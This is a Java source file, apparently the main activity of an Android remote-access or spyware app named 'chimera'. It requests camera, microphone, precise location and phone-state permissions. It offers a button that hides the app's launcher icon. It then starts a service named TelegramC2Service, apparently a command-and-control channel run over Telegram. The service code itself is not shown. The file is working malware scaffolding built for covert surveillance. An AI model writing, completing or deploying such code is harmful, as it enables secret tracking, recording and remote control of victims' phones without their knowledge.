package com.chimera;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnContinue = findViewById(R.id.btnContinue);
        Button btnHide = findViewById(R.id.btnHide);

        btnContinue.setOnClickListener(v -> requestPerms());

        btnHide.setOnClickListener(v -> {
            try {
                PackageManager pm = getPackageManager();
                ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                ErrorLogger.logError(MainActivity.this, "MainActivity_HideClick", e);
            }
        });
    }

    private void requestPerms() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                List<String> permsToRequest = new ArrayList<>();
                permsToRequest.add(Manifest.permission.CAMERA);
                permsToRequest.add(Manifest.permission.RECORD_AUDIO);
                permsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION);
                permsToRequest.add(Manifest.permission.READ_PHONE_STATE);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    permsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
                }

                List<String> neededPerms = new ArrayList<>();
                for (String p : permsToRequest) {
                    if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                        neededPerms.add(p);
                    }
                }

                if (!neededPerms.isEmpty()) {
                    ActivityCompat.requestPermissions(this, neededPerms.toArray(new String[0]), REQ_CODE);
                } else {
                    startC2Service();
                }
            } else {
                startC2Service();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            startC2Service();
        }
    }

    private void startC2Service() {
        try {
            Intent serviceIntent = new Intent(this, TelegramC2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            finish();
        } catch (Exception e) {
            ErrorLogger.logError(this, "MainActivity_StartTelegram", e);
        }
    }
}